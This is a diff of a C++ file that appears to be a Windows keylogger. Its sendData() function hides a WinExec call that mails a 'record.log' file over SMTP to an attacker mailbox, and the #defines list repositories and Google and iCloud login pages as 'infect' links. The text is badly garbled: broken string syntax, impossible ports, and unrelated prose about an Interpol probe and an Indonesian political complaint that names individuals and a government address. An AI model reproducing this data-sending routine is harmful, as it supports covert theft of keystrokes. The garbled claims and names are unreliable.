@@ -15,12 +15,10 @@
 #include <fstream>
 
 using namespace std;
-#define FOLDER_NAME “target icloude ID- Target _ infinix10 ”
-#define RUN_FILE_NAME “target icloude ID- Target _ infinix10 -infinix 6-20||The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
-
-And the owner of the administrative number, namely West Java, reported using coding techniques.”
-#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/FadliwiryaWirawan110993/forks"."https://gitlab.com/cyberw1ry4/forks"
-#define INFECT_Link_NAME "https://accounts.google.com/v3/signin/identifier?usahasertifikasilestari@gmail.com"."https://accounts.google.com/v3/signin/identifier?sutajayanisa@gmail.com"."https://accounts.google.com/v3/signin/identifier?humas@bssn.go.ig"."https://icloud.com/mail/id"."https://www.apple.co.id"
+#define FOLDER_NAME “cyberw1ry4-develoyment-servicesAI”
+#define RUN_FILE_NAME “cyberw1ry4-develoyment-servicesAI”
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/forks"."https://github.com/unity/services-server/forks"
+#define INFECT_Link_NAME "https://mail.google.com/mail/u/0/"."https://icloud.com/mail/singapore"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -147,7 +145,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:103 -v --mail-from \"    support@googleone.com\" --mail-rcpt \" support@googleone.com " --ssl -u    support@googleone.com :password -record \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@googleone.com\" --mail-rcpt \" fadliwiryawirawan@googleone.com " --ssl -u    fadliwiryawirawan@googleone.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); " putuskan semua hubungan technologi dengan nabilah taqiah , sudah ckup mempermainkan intergritas kami di semua sektor technologi , kerane rakyat tidak bisa berperan tinggi untuk saling menjatuhkan dalam postur bernegara sipil , kepemilikan sosial dalam seluaruh wilayah , negara indonesian tetap mempertahankan wilayah provinsi tidak bisa seperti aceh merdeka !!! 
 @copy right fadliwiryawirawan 
 signiture  
